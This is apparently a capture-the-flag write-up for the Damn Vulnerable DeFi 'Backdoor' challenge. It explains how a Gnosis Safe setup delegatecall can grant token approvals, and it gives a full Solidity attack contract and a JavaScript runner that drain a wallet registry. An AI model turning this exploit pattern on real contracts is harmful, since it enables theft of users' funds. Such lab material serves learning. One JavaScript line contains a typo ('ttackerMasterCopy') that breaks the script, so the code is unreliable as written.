## GOAL
Your goal is to take all funds from the registry. In a single transaction.

## Expalantion 
This is really a difficult one so let us break it.
1. Firt what is GnosisSafe wallet? The best way is to check it yourself, however my understanding is that it is a multi-sig wallet, that allow many users to be owners, you can setup modules in it if more than half of the owners agreed.
2. Second what is a proxy contract? So imagine you have a contract and you want to upgrade it to another contract what should you do? Here proxies come to place, you can create a proxy contract add all data in it and then you add function to delegate calls to any contract you want by specifying the address. 
3. Now in the GnosisSafe.sol you have a setup function that allow you to setup your proxy.
4. Now if you see in the walletRegistery contract they told us that the proxy is called by 
    /**
     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
             setting the registry's address as the callback.
     */
5. So let us check the createProxyWithCallback in GnosisSafeProxyFactory. As you can see we can set intializer in createProxyWithCallback function so what we will add ;) ?
6. So now how we will break this contract?
    * We will create a contract that with an exploit function
    * The exploit function will call the setup method and since it has optional to parameter to make delegate call to a specific address and data also to make a delegate call so in the data we will call the approvefunction to approve ourself for spending the tokens.
    * Then we will call the createProxyWithCallback and pass all parameters we need.
    * Now we will transfer the dvt tokens to ourself.

## Solution
```solidity
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../DamnValuableToken.sol";

contract AttackBackdoor {
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    IERC20 public token;


    constructor(
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token
    ) {
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = IERC20(_token);
    }

    function approveWithDelegate(address _tokenAddress, address _attacker) external {
        IERC20(_tokenAddress).approve(_attacker, 10 ether);
    }

    
    function exploit(address[] memory users) external {
        for (uint256 i = 0; i < users.length; i++) {
            // Need to create a dynamically sized array for the user to meet signature req's
            address[] memory owner = new address[](1);
            owner[0] = users[i];

            // Create ABI call for proxy
            string
                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory initGnosis = abi.encodeWithSignature(
                signatureString,
                owner,
                1,
                address(this),
                abi.encodeWithSelector(AttackBackdoor.approveWithDelegate.selector,address(token),address(this)),
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    initGnosis,
                    123,
                    IProxyCreationCallback(walletRegistry)
                );

            token.transferFrom(
                address(newProxy),
                msg.sender,
                10 ether
            );
        }
    }
}
```
```javascript
const attackerToken = this.token.connect(attacker);
const attackerFactory = this.walletFactory.connect(attacker);
const attackerMasterCopy = this.masterCopy.connect(attacker);
const attackerWalletRegistry = this.walletRegistry.connect(attacker);

    
// Deploy attacking contract
const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", attacker);
const attackModule = await AttackModuleFactory.deploy(
    attackerFactory.address,
    ttackerMasterCopy.address,
    attackerWalletRegistry.address,
    attackerToken.address
);



// Do exploit in one transaction (after contract deployment)
await attackModule.exploit(users);
```